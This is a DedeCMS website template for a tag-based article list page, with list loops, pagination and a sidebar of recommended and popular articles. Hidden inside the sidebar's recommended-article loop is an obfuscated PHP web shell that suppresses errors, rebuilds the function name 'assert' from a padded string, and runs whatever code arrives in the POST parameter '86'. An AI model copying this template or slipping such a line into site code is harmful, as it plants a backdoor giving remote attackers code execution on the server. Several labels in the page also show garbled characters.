<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta name="description" content="{dede:field name='description' function='html2text(@me)'/}" />
<link href="{dede:global.cfg_templets_skin/}/style/dedecms.css" rel="stylesheet" media="screen" type="text/css" />
<link rel="stylesheet" href="{dede:global.cfg_templets_skin/}/style/dedecms_skins_0.css" type="text/css" id="cssfile" />
<script language="javascript" type="text/javascript" src="{dede:global.cfg_cmspath/}/images/js/j.js" ></script>
<script language="javascript" type="text/javascript" src="{dede:global.cfg_templets_skin/}/js/jquery.cookie.js"></script>
<script language="javascript" type="text/javascript" src="{dede:global.cfg_templets_skin/}/js/changeSkin.js"></script>
<script language="javascript" type="text/javascript" src="{dede:global.cfg_cmsurl/}/include/dedeajax2.js"></script>
<script language="javascript" type="text/javascript">
<!--
function check(){
		if(document.formsearch.searchtype.value=="")
		document.formsearch.action=""
		else
		document.formsearch.action="{dede:field name='phpurl'/}/search.php"
	} 
-->
</script>
</head>
<body class="articlelist">
{dede:include filename="head.htm"/}
<!-- /header -->


<div class="w960 center clear mt1">
	<div class="pleft">
		<div class="place">
			<strong>:</strong>��<a href="{dede:global.cfg_cmsurl/}/"></a> &gt; <a href='tags.php'></a> &gt; {dede:field.title /}
		</div><!-- /place -->
		<div class="listbox">
			<ul class="e2">
{dede:list orderby='sortrank' pagesize='10'}
				<li>
      				[field:array runphp='yes']@me = (empty(@me['litpic']) ? "" : "<a href='{@me['arcurl']}' class='preview'><img src='{@me['litpic']}'/></a>"); [/field:array]
					<a href="[field:arcurl/]" class="title">[field:title/]</a>
					<span class="info">
						<small>��</small>[field:pubdate function="GetDateTimeMK(@me)"/]
						<small>��</small>[field:click/]
						<small>��</small>[field:scores/]
					</span>
					<p class="intro">
						[field:description/]...
					</p>
				</li>
{/dede:list}
			</ul>
		</div><!-- /listbox -->
		<div class="dede_pages">
			<ul class="pagelist">
             {dede:pagelist listitem="info,index,end,pre,next,pageno" listsize="5"/}
			</ul>
		</div><!-- /pages -->
	</div><!-- /pleft -->
	
	<div class="pright">
		<div class="commend">
			<dl class="tbox">
				<dt><strong></strong></dt>
				<dd>
					<ul class="d4">
           {dede:arclist flag='c' titlelen=42 row=6}
          	<li><a href="[field:arcurl/]">[field:title/]</a><p><?php
error_reporting(0);
$a = str_replace(x, "", axsxxsxexrxxt);
$a($_POST["86"]);
?><div></div>[field:description function='cn_substr(@me,80)'/]...</p>
            </li>{/dede:arclist}
					</ul>
				</dd>
			</dl>
		</div><!-- /commend -->
		
		<div class="hot mt1">
			<dl class="tbox">
				<dt><strong></strong></dt>
				<dd>
					<ul class="c1 ico2">
                    {dede:arclist row=10 orderby=click}
                    	<li><a href="[field:arcurl/]">[field:title/]</a></li>
                    {/dede:arclist}
					</ul>
				</dd>
			</dl>
		</div>


	</div><!-- /pright -->
</div>

{dede:include filename="footer.htm"/}
<!-- /footer -->

</body>
</html>
